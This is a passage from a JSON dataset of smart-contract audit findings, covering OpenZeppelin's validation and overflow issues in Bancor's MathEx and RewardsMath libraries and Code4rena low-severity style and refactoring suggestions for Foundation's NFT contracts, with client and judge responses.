      "content": "Throughout the codebase, there are places where a proper input/output validation is lacking. In particular:\n\n\n* The[`inverse`](https://github.com/bancorprotocol/contracts-v3/blob/b2224595afab14827ee065cb65a1444d61689fb3/contracts/utility/FractionLibrary.sol#L52-L73)and[`fromFraction112`](https://github.com/bancorprotocol/contracts-v3/blob/b2224595afab14827ee065cb65a1444d61689fb3/contracts/utility/FractionLibrary.sol#L87)functions in[`FractionLibrary`](https://github.com/bancorprotocol/contracts-v3/blob/b2224595afab14827ee065cb65a1444d61689fb3/contracts/utility/FractionLibrary.sol)do not check if they were provided an invalid fraction.\n* The[`_mulMod`](https://github.com/bancorprotocol/contracts-v3/blob/b2224595afab14827ee065cb65a1444d61689fb3/contracts/utility/MathEx.sol#L332),[`mulDivC`](https://github.com/bancorprotocol/contracts-v3/blob/b2224595afab14827ee065cb65a1444d61689fb3/contracts/utility/MathEx.sol#L202),[`mulDivF`](https://github.com/bancorprotocol/contracts-v3/blob/b2224595afab14827ee065cb65a1444d61689fb3/contracts/utility/MathEx.sol#L168)functions in the[`MathEx`](https://github.com/bancorprotocol/contracts-v3/blob/b2224595afab14827ee065cb65a1444d61689fb3/contracts/utility/MathEx.sol)library do not check that`z`in non-zero. In such cases they revert with a Panic, rather than a more helpful error message.\n* The[`isInRange`](https://github.com/bancorprotocol/contracts-v3/blob/b2224595afab14827ee065cb65a1444d61689fb3/contracts/utility/MathEx.sol#L140)and[`weightedAverage`](https://github.com/bancorprotocol/contracts-v3/blob/b2224595afab14827ee065cb65a1444d61689fb3/contracts/utility/MathEx.sol#L123)functions in the[`MathEx`](https://github.com/bancorprotocol/contracts-v3/blob/b2224595afab14827ee065cb65a1444d61689fb3/contracts/utility/MathEx.sol)library do not check that the input fractions are valid. The latter also does not ensure it is returning a valid fraction.\n\n\nA lack of validation on user-controlled parameters may result in erroneous or failing transactions that are difficult to debug. This is especially true in the case of libraries that are capable of being reused across different codebases. To avoid this, consider adding input and output validation to address the concerns raised above.\n\n\n**Update:***Acknowledged without code changes. The client expressed that the lack of reversion on invalid inputs is intentional. In some cases it is desirable behavior to turn divide by zero inputs into zero outputs. In other cases, error messages will be raised somewhere else along the call chain in practice.*",
      "summary": "\nThis bug report discusses the lack of input/output validation in the Bancor Protocol codebase. Specifically, the `inverse` and `fromFraction112` functions in the `FractionLibrary`, the `_mulMod`, `mulDivC`, and `mulDivF` functions in the `MathEx` library, and the `isInRange` and `weightedAverage` functions in the `MathEx` library are all missing proper validation. Without validation, transactions that make use of these functions may fail or produce erroneous results, making them difficult to debug. \n\nThe client acknowledged the bug but expressed that the lack of reversion on invalid inputs is intentional. In some cases, it is desirable to turn divide by zero inputs into zero outputs, while in other cases, error messages will be raised elsewhere. To avoid the issues raised in the bug report, consider adding input and output validation to address the concerns.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Bancor Compounding Rewards Audit",
      "source_link": "https://blog.openzeppelin.com/bancor-compounding-rewards-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10514",
      "title": "calcExpDecayRewardsis at risk of overflow reversions",
      "impact": "MEDIUM",
      "content": "In the[`RewardsMath`](https://github.com/bancorprotocol/contracts-v3/blob/b2224595afab14827ee065cb65a1444d61689fb3/contracts/rewards/RewardsMath.sol)contract the[`calcExpDecayRewards`](https://github.com/bancorprotocol/contracts-v3/blob/b2224595afab14827ee065cb65a1444d61689fb3/contracts/rewards/RewardsMath.sol#L30)function takes`timeElapsed`and`halfLife`values as input, puts them into a`Fraction`struct, and then passes them along to the[`MathEx.exp2`](https://github.com/bancorprotocol/contracts-v3/blob/b2224595afab14827ee065cb65a1444d61689fb3/contracts/utility/MathEx.sol#L36)function. There is a[comment in the inline documentation](https://github.com/bancorprotocol/contracts-v3/blob/b2224595afab14827ee065cb65a1444d61689fb3/contracts/rewards/RewardsMath.sol#L27-L29)that\n\n\n\n> because the exponentiation function is limited to an input of up to (and excluding) 16 / ln 2, the input value to this function is limited by`timeElapsed / halfLife < 16 / ln 2`\n> \n> \n\n\nThis is problematic because, for any exponential decay distribution program,`halfLife`is fixed while`timeElapsed`will continue to grow after the program is created. For any such program then, it is only a matter of time before`timeElapsed`exceeds`halfLife`by more than the required ratio to overflow a call to`exp2`.\n\n\nIf`timeElapsed / halfLife`exceeds this limit, then the call will simply[revert in the`exp2`function with an`Overflow`error](https://github.com/bancorprotocol/contracts-v3/blob/b2224595afab14827ee065cb65a1444d61689fb3/contracts/utility/MathEx.sol#L43). This will cause the entire transaction to revert. Since`calcExpDecayRewards`is called by the[`_tokenAmountToDistribute`](https://github.com/bancorprotocol/contracts-v3/blob/b2224595afab14827ee065cb65a1444d61689fb3/contracts/rewards/AutoCompoundingRewards.sol#L471-L472)function, which is called by the[`_processRewards`](https://github.com/bancorprotocol/contracts-v3/blob/b2224595afab14827ee065cb65a1444d61689fb3/contracts/rewards/AutoCompoundingRewards.sol#L378)function, no rewards for a program that reaches such a state will be possible.\n\n\nIn such a scenario where the`timeElapsed`is too large, rather than making the call to`exp2`and then reverting, consider having the`calcExpDecayRewards`function return`totalRewards`without any exponentiation calculation. This will result in minimal error (i.e.,`1 * totalRewards`instead of`0.9999998874648253 * totalRewards`), but will prevent the case where a programs rewards cannot be distributed because too much time elapses from the programs start.\n\n\n**Update:***Acknowledged without code changes. The client expressed that the function inputs are safe for timeframes considered practical. In the case of impractical timeframes the impact is acceptable.*",
      "summary": "\nThe bug report is about the `RewardsMath` contract in the Bancor Protocol. This contract contains a `calcExpDecayRewards` function which takes `timeElapsed` and `halfLife` values as input and passes them to the `MathEx.exp2` function. There is an inline documentation comment that states the input value of `timeElapsed / halfLife` should be less than 16 / ln 2. However, this poses a problem as `halfLife` is fixed while `timeElapsed` will continue to grow after the program is created. If `timeElapsed / halfLife` exceeds this limit, the call to `exp2` will result in an `Overflow` error and the entire transaction will revert. This means no rewards will be able to be distributed if too much time elapses from the program's start. \n\nTo prevent this issue, the `calcExpDecayRewards` function should return `totalRewards` without any exponentiation calculation. This will result in minimal error, but will prevent rewards from being unable to be distributed. The client has acknowledged this bug without making code changes, as the function inputs are safe for timeframes considered practical.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Bancor Compounding Rewards Audit",
      "source_link": "https://blog.openzeppelin.com/bancor-compounding-rewards-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10513",
      "title": "weightedAveragecalculation might overflow",
      "impact": "MEDIUM",
      "content": "In the[`MathEx`](https://github.com/bancorprotocol/contracts-v3/blob/b2224595afab14827ee065cb65a1444d61689fb3/contracts/utility/MathEx.sol)library the function[`weightedAverage`](https://github.com/bancorprotocol/contracts-v3/blob/b2224595afab14827ee065cb65a1444d61689fb3/contracts/utility/MathEx.sol#L123)performs a multiplication of up to three`uint256`input variables without any prior validation. As the resulting number can have up to`768`bits, it is very likely to lead to an overflow during`uint256`-multiplication.\n\n\nCurrently, the function`weightedAverage`is only used in the[`_calcAverageRate`](https://github.com/bancorprotocol/contracts-v3/blob/b2224595afab14827ee065cb65a1444d61689fb3/contracts/pools/PoolCollection.sol#L1611)function in the`PoolCollection`contract. Further, the`_calcAverageRate`function is currently used in a way that ensures a maximum size of`128`,`112`and`3`bits for the three operands passed to`weightedAverage`.\n\n\nWhile the current usage of`weightedAverage`within the codebase appears to be safe from`uint256`overflows, consider adding input validation to`weightedAverage`and including explicit preconditions in the function documentation to ensure that future versions of the codebase remain free from overflows.\n\n\n**Update:***Acknowledged without code changes. In an effort to keep library functions lean, the client generally prefers panics over explicit error messages. Note that the function documentation continues to omit any description about preconditions.*",
      "summary": "\nThe bug report is about the MathEx library, which contains a function called weightedAverage. This function performs multiplication of up to three uint256 input variables without any prior validation. As the resulting number can have up to 768 bits, it is very likely to lead to an overflow during uint256-multiplication. \n\nCurrently, the function weightedAverage is used in the _calcAverageRate function in the PoolCollection contract. This function ensures a maximum size of 128, 112 and 3 bits for the three operands passed to weightedAverage, thus making the current usage of weightedAverage safe from uint256 overflows. \n\nIt is suggested to add input validation to weightedAverage and include explicit preconditions in the function documentation to ensure that future versions of the codebase remain free from overflows. The client has acknowledged the suggestion without making any code changes. However, the function documentation still does not include any description about preconditions.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Bancor Compounding Rewards Audit",
      "source_link": "https://blog.openzeppelin.com/bancor-compounding-rewards-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10512",
      "title": "reducedFractiondoes notreducein the mathematical sense",
      "impact": "HIGH",
      "content": "In the[`MathEx`](https://github.com/bancorprotocol/contracts-v3/blob/b2224595afab14827ee065cb65a1444d61689fb3/contracts/utility/MathEx.sol)library, the function[`reducedFraction`](https://github.com/bancorprotocol/contracts-v3/blob/b2224595afab14827ee065cb65a1444d61689fb3/contracts/utility/MathEx.sol#L110)does not reduce the Fraction, instead it truncates the numerator and denominator in a way that ensures it is lower than a given maximum. So, rather than using the greatest common denominator between the numerator and denominator to reduce the fraction, this`reducedFraction`function merely prunes the numerator and denominator to ensure that they are less than the provided max, and, in so doing, loses precision. In some instances the deviation between the fraction and the result of`reducedFraction`can be over 10%.\n\n\nConsider either revising the function to reduce the loss of precision or renaming the function to`truncateFraction`and providing more inline documentation that makes the loss of precision clear.\n\n\n**Update:***Fixed in commit[`2cb941a636dd9b0c210dd52ee90907eeb02eea6a`](https://github.com/bancorprotocol/contracts-v3/commit/2cb941a636dd9b0c210dd52ee90907eeb02eea6a)and commit[`56be8479ec633e0e59385dfcbe66de4759acb4bc`](https://github.com/bancorprotocol/contracts-v3/commit/56be8479ec633e0e59385dfcbe66de4759acb4bc).*",
      "summary": "\nThis bug report is regarding the MathEx library's reducedFraction function. This function does not reduce the fraction, instead it truncates the numerator and denominator to ensure that they are lower than a given maximum. This means that the fraction is not reduced using the greatest common denominator, resulting in a loss of precision. In some instances, the deviation between the fraction and the result of reducedFraction can be over 10%. \n\nIt is recommended that the function be revised to reduce the loss of precision or that it be renamed to truncateFraction and that more inline documentation is provided to make it clear that precision is lost. This issue has now been fixed with two commits in the Github repository.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Bancor Compounding Rewards Audit",
      "source_link": "https://blog.openzeppelin.com/bancor-compounding-rewards-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "24161",
      "title": "[14] Avoid Nested `if` Blocks",
      "impact": "LOW",
      "content": "\nFor better readability and analysis it is better to avoid nested `if` blocks. Here is an example:\n\n### 14.1 FETH.sol (lines [482-492](https://github.com/code-423n4/2022-08-foundation/blob/792e00df42/contracts/FETH.sol#L482-L492))\n\nAfter edit:\n\n```solidity\nif (spenderAllowance == type(uint256).max) {\n\treturn ;\n}\n\nif (spenderAllowance < amount) {\n\trevert FETH_Insufficient_Allowance(spenderAllowance);\n}\n// The check above ensures allowance cannot underflow.\nunchecked {\n\tspenderAllowance -= amount;\n}\naccountInfo.allowance[msg.sender] = spenderAllowance;\nemit Approval(from, msg.sender, spenderAllowance);\n```\n\n**[HardlyDifficult (judge) commented](https://github.com/code-423n4/2022-08-foundation-findings/issues/184#issuecomment-1219792087):**\n> Very detailed and thoughtful feedback -- thank you!\n> \n>[1] supportsInterface can be rewritten to avoid the if/else branching:\n> \n> > I think I do like this style more, will consider the change.\n> \n>[2] contracts/interfaces/ICollectionFactory.sol\n> \n> > Agree, fixed.\n> \n>[3] contracts/mixins/shared/ContractFactory.sol\n> \n> > Not sure I'm following this suggestion. There does not appear to be another .code.length type check included at the moment. Considering a stricter check is compelling but since this is an admin function call I think that may be overkill here.\n> \n>[4.1] Shorter inheritance list\n> \n> > True but for top-level contracts I like to expand all inherited contracts to make it clear what all the dependencies are and the lineriazation order they are included in.\n> \n>[4.2] CID need to be unique per tokenID\n> \n> > Agree. This is a primary goal of the NFTDropCollection. As you note there are other more flexible ways we could run with this type of approach and we may consider those in the future.\n> \n>[5.1] .isContract()\n> \n> > Fair feedback. Considering a stricter check is compelling but since this is an admin function call I think that may be overkill here.\n> \n>[5.2] versionNFTDropCollection\n> \n> > By design - the default value of 0 is correct there. NFTCollections were previously created by a different factory contract, we wanted the new factory to pick up version where that left off. But drops are new so starting at 0 is correct.\n> \n>[5.3] a better name can be chosen for rolesContract\n> \n> >Agree, I like that name more and will update.\n> \n>[6.2] The comment on line [175](https://github.com/code-423n4/2022-08-foundation/blob/792e00df42/contracts/NFTDropCollection.sol#L175) needs a bit of correction\n> \n> > Good catch -- this was missed after adding a require against count == 0. Will fix.\n> \n>[7] contracts/mixins/nftDropMarket/NFTDropMarketFixedPriceSale.sol\n> \n> > Although minor, this approach was used to save gas for the happy case scenario since it avoids a second if condition.\n> \n>[8] contracts/FETH.sol (Out of Scope)\n> \n> >Fair feedback, but I think the current approach is easier to reason about. And saving admin-only gas is not a goal for us.\n> \n>[9] Line Width\n> \n> > Our linter is configured to require 120... although maybe you mean we are adding new lines too early in some instances (?)\n> \n>[10] Hard-coded gas limits\n> \n> > Fair feedback. However the use case requires some gas limit to be defined and it's not clear there is a viable alternative here.\n> \n>[11] address.isContract check\n> \n> >This is good feedback. ATM these checks are there to help avoid simple errors by the admin. I'm not sure that the stricter check is worth the complexity to maintain.\n> \n>[12] Use fixed pragma\n> \n> >Disagree. We intentionally use a floating pragma in order to make integrating with contracts easier. Other contract developers are looking to interact with our contracts and they may be on a different version than we use. The pragma selected for our contracts is the minimum required in order to correctly compile and function. This way integration is easier if they lag a few versions behind, or if they use the latest but we don't bump our packages frequently enough, and when we do upgrade versions unless there was a breaking solidity change -- it should just swap in by incrementing our npm package version.\n> \n>[14] Avoid Nested if Blocks\n> \n> >(out of scope) I agree that style is better, will fix.\n\n**[HickupHH3 (judge) commented](https://github.com/code-423n4/2022-08-foundation-findings/issues/184#issuecomment-1255770289):**\n > Slightly disagree with #3. Agree with sponsor that the suggestion isn't clear.\n\n\n\n***\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Foundation",
      "source_link": "https://code4rena.com/reports/2022-08-foundation",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24160",
      "title": "[13] Floating Solidity Pragma Version",
      "impact": "LOW",
      "content": "\nIt's best to use the same compiler version across all project files/team members. So having a fixed version pragma is a good practice. Most contracts use a floating pragma which would allow the patch number to be equal or higher than the specified patch number.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Foundation",
      "source_link": "https://code4rena.com/reports/2022-08-foundation",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24159",
      "title": "[12] Simplify `supportsInterface` check",
      "impact": "LOW",
      "content": "\n### 12.1 NFTDropCollection.sol\n\n`NFTDropCollection.supportsInterface` (lines [284-295](https://github.com/code-423n4/2022-08-foundation/blob/792e00df42/contracts/NFTDropCollection.sol#L284-L295)) can be changed to:\n\n```solidity\nfunction supportsInterface(bytes4 interfaceId)\n\tpublic\n\tview\n\toverride(ERC165Upgradeable, AccessControlUpgradeable, ERC721Upgradeable, CollectionRoyalties)\n\treturns (bool)\n{\n\treturn (\n\t\tinterfaceId == type(INFTDropCollectionMint).interfaceId || \n\t\tsuper.supportsInterface(interfaceId);\n\t);\n}\n```\n\n### 12.2 CollectionRoyalties.sol\n\n`CollectionRoyalties.supportsInterface` (lines [80-91](https://github.com/code-423n4/2022-08-foundation/blob/792e00df42/contracts/mixins/collections/CollectionRoyalties.sol#L80-L91)) can be changed to:\n\n```solidity\nfunction supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {\n\treturn (\n\t\tinterfaceId == type(IRoyaltyInfo).interfaceId ||\n\t\tinterfaceId == type(ITokenCreator).interfaceId ||\n\t\tinterfaceId == type(IGetRoyalties).interfaceId ||\n\t\tinterfaceId == type(IGetFees).interfaceId ||\n\t\tinterfaceSupported = super.supportsInterface(interfaceId)\n\t)\n}\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Foundation",
      "source_link": "https://code4rena.com/reports/2022-08-foundation",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24158",
      "title": "[11] `address.isContract` check",
      "impact": "LOW",
      "content": "\nLots of the contracts in this project import `import \"@openzeppelin/contracts-upgradeable/utils/AddressUpgradeable.sol\"` and use `address.isContract()` to check if an address is a contract and not a EOA. I guess this is only a check if the deployer by mistake provides the wrong address. I think this should be double-checked off-chain. If an on-chain check is needed, there are other checks that can be done that are even more strict than just checking against EOA mistakes. For example, we can provide the contract as the second input to the constructor and check the address's codehash against that. Here is a template as an example:\n\n```solidity\nconstructor(address c, bytes32 h) {\n\tif( c.codehash != h) {\n\t\trevert CustomError();\n\t}\n}\n```\n\nNot only does this check for address with code, but also pinpoints the contract hash to a specific hash. Another type of check that can be used is to check if the provided contract address supports a specific `interfaceSupport` or call an endpoint of the contract expecting it to return a specific magic number.\n\nHere is a list of places `isContract` has been used:\n\n1.  [FETH.sol - L201](https://github.com/code-423n4/2022-08-foundation/blob/792e00df429b0df9ee5d909a0a5a6e72bd07cf79/contracts/FETH.sol#L201)\n2.  [FETH.sol - L204](https://github.com/code-423n4/2022-08-foundation/blob/792e00df429b0df9ee5d909a0a5a6e72bd07cf79/contracts/FETH.sol#L204)\n3.  [NFTCollectionFactory.sol - L182](https://github.com/code-423n4/2022-08-foundation/blob/792e00df42/contracts/NFTCollectionFactory.sol#L182)\n4.  [NFTCollectionFactory.sol - L203](https://github.com/code-423n4/2022-08-foundation/blob/792e00df42/contracts/NFTCollectionFactory.sol#L203)\n5.  [NFTCollectionFactory.sol - L227](https://github.com/code-423n4/2022-08-foundation/blob/792e00df42/contracts/NFTCollectionFactory.sol#L227)\n6.  [PercentSplitETH.sol - L171](https://github.com/code-423n4/2022-08-foundation/blob/792e00df42/contracts/PercentSplitETH.sol#L171)\n7.  [AddressLibrary.sol - L31](https://github.com/code-423n4/2022-08-foundation/blob/792e00df42/contracts/libraries/AddressLibrary.sol#L31)\n8.  [ContractFactory.sol - L31](https://github.com/code-423n4/2022-08-foundation/blob/792e00df42/contracts/mixins/shared/ContractFactory.sol#L31)\n9.  [FETHNode.sol - L23](https://github.com/code-423n4/2022-08-foundation/blob/792e00df42/contracts/mixins/shared/FETHNode.sol#L23)\n10. [FoundationTreasuryNode.sol - L48](https://github.com/code-423n4/2022-08-foundation/blob/792e00df42/contracts/mixins/shared/FoundationTreasuryNode.sol#L48)\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Foundation",
      "source_link": "https://code4rena.com/reports/2022-08-foundation",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24157",
      "title": "[10] Hard-coded gas limits",
      "impact": "LOW",
      "content": "\nIn `contracts/mixins/shared/Constants.sol` we have 3 gas limit constants:\n\n```solidity\nuint256 constant READ_ONLY_GAS_LIMIT = 40000;\nuint256 constant SEND_VALUE_GAS_LIMIT_MULTIPLE_RECIPIENTS = 210000;\nuint256 constant SEND_VALUE_GAS_LIMIT_SINGLE_RECIPIENT = 20000;\n```\n\nThese numbers are not future-proof as some hardforks introduce changes to gas costs. These potential future changes to gas costs might break some of the functionalities of the smart contracts that use these constants. This is something to keep in mind. If some hardfork, would break a smart contract using these numbers you would need to deploy new contracts with adjusted gas limit constants. Or you can also have these gas limits be mutable by admins on-chain. For example, all 3 of these values can be stored on-chain in 1 storage slot.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Foundation",
      "source_link": "https://code4rena.com/reports/2022-08-foundation",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24156",
      "title": "[9] Line Width",
      "impact": "LOW",
      "content": "\nKeep line width to max 120 characters for better readability.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Foundation",
      "source_link": "https://code4rena.com/reports/2022-08-foundation",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24155",
      "title": "[8] contracts/FETH.sol (Out of Scope)",
      "impact": "LOW",
      "content": "\nIn `constructor` instead of passing `_lockupDuration` pass `_lockupInterval` to save on the exact division check.\n\nSo taking that into consideration the `constructor` would look like this:\n\n```solidity\nconstructor(\n\taddress payable _foundationMarket,\n\taddress payable _foundationDropMarket,\n\tuint256 _lockupInterval\n) {\n\tif (!_foundationMarket.isContract()) {\n\t\trevert FETH_Market_Must_Be_A_Contract();\n\t}\n\tif (!_foundationDropMarket.isContract()) {\n\t\trevert FETH_Market_Must_Be_A_Contract();\n\t}\n\tif (_lockupInterval == 0) {\n\t\trevert FETH_Invalid_Lockup_Duration();\n\t}\n\n\tfoundationMarket = _foundationMarket;\n\tfoundationDropMarket = _foundationDropMarket;\n\tlockupInterval = _lockupInterval; \n\tlockupDuration = _lockupInterval * 24;\n}\n```\n\nAlso, the `_lockupInterval`  check is moved up before the assignments to save gas in case of a revert. If there will be no revert, moving up the `if` block would not introduce any gas changes, since the check will be performed eventually.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Foundation",
      "source_link": "https://code4rena.com/reports/2022-08-foundation",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24154",
      "title": "[7] contracts/mixins/nftDropMarket/NFTDropMarketFixedPriceSale.sol",
      "impact": "LOW",
      "content": "\nIn `mintFromFixedPriceSale` we can avoid the nested `if` blocks on lines [182-189](https://github.com/code-423n4/2022-08-foundation/blob/792e00df42/contracts/mixins/nftDropMarket/NFTDropMarketFixedPriceSale.sol#L182-L189). This would improve readability and analyze and it would have the same effect. On the plus side, it will also save gas for a reverting call where `saleConfig.limitPerAccount` is zero by avoiding the outer `if` block in the original code.\n\n```solidity\n// Confirm that the collection has a sale in progress.\nif (saleConfig.limitPerAccount == 0) {\n\trevert NFTDropMarketFixedPriceSale_Must_Have_Sale_In_Progress();\n}\n// Confirm that the buyer will not exceed the limit specified after minting.\nif (IERC721(nftContract).balanceOf(msg.sender) + count > saleConfig.limitPerAccount) {\t\n\trevert NFTDropMarketFixedPriceSale_Cannot_Buy_More_Than_Limit(saleConfig.limitPerAccount);\n}\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Foundation",
      "source_link": "https://code4rena.com/reports/2022-08-foundation",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24153",
      "title": "[6] contracts/NFTDropCollection.sol",
      "impact": "LOW",
      "content": "\n### 6.1 `supportsInterface` function\n\nWe can rewrite `supportsInterface` function (Lines [284-294](https://github.com/code-423n4/2022-08-foundation/blob/792e00df42/contracts/NFTDropCollection.sol#L284-L294)) like the following block which would make it easier to read and possibly would save some gas.\n\n```solidity\nfunction supportsInterface(bytes4 interfaceId)\n\tpublic\n\tview\n\toverride(ERC165Upgradeable, AccessControlUpgradeable, ERC721Upgradeable, CollectionRoyalties)\n\treturns (bool)\n{\n\treturn (\n\t\tinterfaceId == type(INFTDropCollectionMint).interfaceId ||\n\t\tsuper.supportsInterface(interfaceId)\n\t);\n}\n```\n\n### 6.2 The comment on line [175](https://github.com/code-423n4/2022-08-foundation/blob/792e00df42/contracts/NFTDropCollection.sol#L175) needs a bit of correction\n\nSo the current comment says:\n\n> If +1 overflows then +count would also overflow, **unless count==0 in which case the loop would exceed gas limits**\n\nBut `count` can not be zero if we have reached this line. Since we have already checked for a non-zero `count` on line [172](https://github.com/code-423n4/2022-08-foundation/blob/792e00df42/contracts/NFTDropCollection.sol#L172)\n\nSo we can change the comment to\n\n```solidity\n// If +1 overflows then +count would also overflow, since count > 0.\n```\n\n### 6.3 Shorter inheritance list\n\nLike `NFTCollection`, the inheritence list for `NFTDropCollection` contract on lines [28-46](https://github.com/code-423n4/2022-08-foundation/blob/792e00df42/contracts/NFTDropCollection.sol#L28-L46) can be consolidated more.\n\n```solidity\ncontract NFTDropCollection is\n  INFTDropCollectionInitializer,\n  INFTDropCollectionMint,\n  ContractFactory,\n  MinterRole,\n  SequentialMintCollection,\n  CollectionRoyalties\n{\n```\n\nThe `overrides` on lines [245](https://github.com/code-423n4/2022-08-foundation/blob/792e00df42/contracts/NFTDropCollection.sol#L245) and [287](https://github.com/code-423n4/2022-08-foundation/blob/792e00df42/contracts/NFTDropCollection.sol#L287) would also need to be modified accordingly.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Foundation",
      "source_link": "https://code4rena.com/reports/2022-08-foundation",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24152",
      "title": "[5] contracts/NFTCollectionFactory.sol",
      "impact": "LOW",
      "content": "\n### 5.1 `.isContract()`\n\nOn lines [182](https://github.com/code-423n4/2022-08-foundation/blob/792e00df42/contracts/NFTCollectionFactory.sol#L182), and [203](https://github.com/code-423n4/2022-08-foundation/blob/792e00df42/contracts/NFTCollectionFactory.sol#L203) instead of checking if `addr.isContract()` to avoid setting the addresses to EOA by mistake it would be best to pass the code hash instead and check the code hash at those addresses. So for example:\n\nBefore:\n\n```solidity\nconstructor(address _rolesContract) {\n\trequire(_rolesContract.isContract(), \"NFTCollectionFactory: RolesContract is not a contract\"); \n\n\trolesContract = IRoles(_rolesContract);\n}\n\n```\n\nAfter:\n\n```solidity\nconstructor(address _rolesContract, bytes32 codehash) {\n\trequire(_rolesContract.codehash == codehash, \"NFTCollectionFactory: RolesContract is not a contract\");\n\n\trolesContract = IRoles(_rolesContract);\n}\n```\n\nThis is a stronger requirement since it would guarantee that the addresses are contracts and also they have the required code hash. For the functions to pass the `require` statements you would need to make 2 mistakes, one for the address and the other for the code hash. The probability of making this mistake should be theoretically lower than just passing a wrong address.\n\n### 5.2 `versionNFTDropCollection`\n\nDoesn't have an initializer like `versionNFTCollection`.\n\n### 5.3 a better name  can be chosen for `rolesContract`\n\n`rolerManager` might be a better name for this immutable variable and would make it easier to remember what it does (ref. line [104](https://github.com/code-423n4/2022-08-foundation/blob/792e00df42/contracts/NFTCollectionFactory.sol#L104)).\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Foundation",
      "source_link": "https://code4rena.com/reports/2022-08-foundation",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24151",
      "title": "[4] contracts/NFTCollection.sol",
      "impact": "LOW",
      "content": "\n### 4.1 Shorter inheritance list\n\nThe inheritance contracts on line [29-40](https://github.com/code-423n4/2022-08-foundation/blob/792e00df42/contracts/NFTCollection.sol#L29-L40) can be consolidated into a shorter list:\n\n```solidity\ncontract NFTCollection is\n  INFTCollectionInitializer,\n  ContractFactory,\n  SequentialMintCollection,\n  CollectionRoyalties\n{\n```\n\nThen you would need to adjust the overrides on lines [255](https://github.com/code-423n4/2022-08-foundation/blob/792e00df42/contracts/NFTCollection.sol#L255) and [316](https://github.com/code-423n4/2022-08-foundation/blob/792e00df42/contracts/NFTCollection.sol#L316)\n\n### 4.2 `CID` need to be unique per `tokenID`\n\nDifferent `tokenID`s can not share the same `CID` by design. Although it is possible to design the contract so that some tokens share the same `CID` to save storage and also server space for off-chain contents.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Foundation",
      "source_link": "https://code4rena.com/reports/2022-08-foundation",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24150",
      "title": "[3] contracts/mixins/shared/ContractFactory.sol",
      "impact": "LOW",
      "content": "\nOn line [31](https://github.com/code-423n4/2022-08-foundation/blob/792e00df42/contracts/mixins/shared/ContractFactory.sol#L31), there is a check for `_contractFactory` to see if it already has a code. I guess this is an extra check that can be removed. Since if `_contractFactory` calls the constructor here in its own constructor by then `_contractFactory.isContract() = _contractFactory.code.length == 0`. Also, it is possible that a wrong contract address is passed here, so the check would not really do anything. This will only check against accidental EOA addresses used for `_contractFactory`. So we could possibly remove the following lines:\n\n```solidity\n 5\timport \"@openzeppelin/contracts-upgradeable/utils/AddressUpgradeable.sol\";\n13 \tusing AddressUpgradeable for address;\n31\trequire(_contractFactory.isContract(), \"ContractFactory: Factory is not a contract\");\n```\n\nIf there is a stricter condition for the allowed `contractFactory` addresses, maybe we could use that instead. One possible idea is an array of implementation contract code hashes that we could check. Or maybe contracts that have a function similar to `supportsInterface` that returns a magic number which we could check here.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Foundation",
      "source_link": "https://code4rena.com/reports/2022-08-foundation",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24149",
      "title": "[2] contracts/interfaces/ICollectionFactory.sol",
      "impact": "LOW",
